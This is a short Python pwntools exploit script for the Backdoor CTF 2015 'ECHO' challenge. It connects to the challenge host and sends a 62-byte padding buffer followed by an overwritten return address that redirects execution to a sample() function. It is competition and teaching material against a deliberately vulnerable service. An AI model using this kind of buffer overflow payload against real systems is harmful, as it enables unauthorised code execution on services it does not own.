#!/usr/bin/python
#
# Backdoor CTF 2015
# ECHO (PWN/100)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack, unpack

host = 'hack.bckdr.in'
h = remote(host, 8002, timeout = None)
buf = "A" * 62 + pack('<I', 0x0804857D) # Address of sample()
h.send(buf + "\n")
print h.recvall()

h.close()